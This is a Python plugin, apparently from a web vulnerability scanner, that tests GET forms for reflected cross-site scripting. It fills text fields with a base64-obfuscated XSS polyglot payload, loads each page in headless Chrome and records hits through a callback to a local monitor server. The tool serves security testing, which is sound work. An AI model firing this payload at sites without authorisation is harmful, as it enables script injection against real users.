# coding:utf-8

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, urlencode
import threading
import time
import base64
import html
import logging

from lib.exceptions import NoRequestsException

from selenium import webdriver
from browsermobproxy import Server

xss_payload = [
    'amFWYXNDcmlwdDovKi0vKmAvKlxgLyonLyoiLyoqLygvKiAqL29OY2xpQ2s9',
    'ICkvLyUwRCUwQSUwZCUwYS8vPC9zdFlsZS88L3RpdExlLzwvdGVYdGFyRWEvPC9zY1JpcHQvLS0hPlx4M2NzVmcvPHNWZy9vTmxvQWQ9',
    'Ly8+XHgzZQ=='
]
script_template = "window.location.href='http://127.0.0.1:{}?uuid={}&name={}&url='+window.location.href"


class ReflectedXSSDetector:
    def __init__(self, results, reports, **kwargs):
        self.results = results
        self.reports = reports
        self.args = kwargs
        self.listen_port = 9760
        self.lock = threading.Lock()
        self.vulnerable = []
        self.server = None
        self.cookies = {}
        for entry in self.args['cookie'].split(';'):
            if entry.find('=') == -1:
                continue
            key, value = entry.strip().split('=', 1)
            self.cookies[key] = value
        # Create proxy server
        logging.info('Starting browsermobproxy server...')
        self.proxy_server = Server(self.args['browsermobproxy'])
        self.proxy_server.start()
        self.proxy = self.proxy_server.create_proxy()
        logging.info('Browsermobproxy server started')
        # Create Chrome engine
        logging.info('Creating Selenium Chrome webdriver...')
        self.chrome_options = webdriver.ChromeOptions()
        self.chrome_options.add_argument('--proxy-server={}'.format(self.proxy.proxy))
        if 'headless' in self.args:
            self.chrome_options.add_argument('--headless')
        self.chrome_options.add_argument('--disable-gpu')
        self.chrome_options.add_argument("--disable-extensions")
        self.driver = webdriver.Chrome(chrome_options=self.chrome_options)
        logging.info('Selenium Chrome webdriver created')

    @staticmethod
    def meta():
        return {
            'name': 'Reflected XSS Detector for all',
            'version': '1.0'
        }

    def start_server(self):
        class Handler(BaseHTTPRequestHandler):
            def do_GET(s):
                query = parse_qs(urlparse(s.path).query)
                if 'uuid' in query and 'name' in query:
                    self.lock.acquire()
                    try:
                        pair = (query['uuid'][0], query['name'][0], query['url'][0])
                        if pair not in self.vulnerable:
                            self.vulnerable.append(pair)
                    finally:
                        self.lock.release()
                s.send_response(200)
                s.send_header('Content-Type', 'text/html')
                s.end_headers()
                s.wfile.write(b'')

        def start_server():
            logging.info('Starting monitor server at port {}...'.format(self.listen_port))
            self.server.serve_forever()

        self.server = HTTPServer(('127.0.0.1', self.listen_port), Handler)
        t = threading.Thread(target=start_server, daemon=True)
        t.start()
        time.sleep(3)

    def proceed(self):
        for uuid in self.results['requests']:
            logging.info('Testing payload for form {}'.format(uuid))
            request = self.results['requests'][uuid]
            if request['content-type'] == 'text/plain' or request['method'] != 'GET':
                logging.warning('Skipped form {} due to its "text/plain" Content-Type or "POST" method'.format(uuid))
                continue
            params = {}
            for name in request['fields']:
                field = request['fields'][name]
                if field['type'] in ['text', 'password', 'textarea']:
                    script = script_template.format(self.listen_port, uuid, name)
                    params[name] = \
                        base64.b64decode(xss_payload[0]).decode('utf-8') + script + \
                        base64.b64decode(xss_payload[1]).decode('utf-8') + script + \
                        base64.b64decode(xss_payload[2]).decode('utf-8')
                elif field['type'] == 'radio':
                    params[name] = field['values'][0]
                elif field['type'] == 'checkbox':
                    params[name] = field['value']
                else:
                    params[name] = field['default']
            url = request['url'] + '?' + urlencode(params)
            self.driver.get(url)
            for key in self.cookies:
                exist = self.driver.get_cookie(key)
                if exist is not None and exist['value'] != self.cookies[key]:
                    self.driver.add_cookie({
                        'name': key,
                        'value': self.cookies[key]
                    })
            self.driver.get(url)

    def stop_server(self):
        self.server.shutdown()
        logging.info('The monitoring server has been closed')

    def make_report(self):
        def make_entry(v):
            request = self.results['requests'][v[0]]
            return [request['location'], request['url'], request['method'], v[1], html.escape(v[2])]

        self.reports.append({
            'title': 'Reflected XSS Injection Points',
            'overview': 'Found {} Reflected XSS injection point(s)'.format(len(self.vulnerable)),
            'header': ['Form Location', 'Target', 'Method', 'Name', 'XSS Location'],
            'entries': list(map(make_entry, self.vulnerable))
        })

    def exec(self):
        logging.info('Start to test reflected XSS points')
        if 'requests' not in self.results:
            logging.fatal('There\'s no requests in results')
            raise NoRequestsException
        self.start_server()
        self.proceed()
        self.stop_server()
        self.make_report()
        logging.info('Stopping proxy server and Chrome webdriver...')
        self.proxy.close()
        self.proxy_server.stop()
        self.driver.stop_client()
        self.driver.close()
        logging.info('Proxy server and Chrome webdriver have been closed')
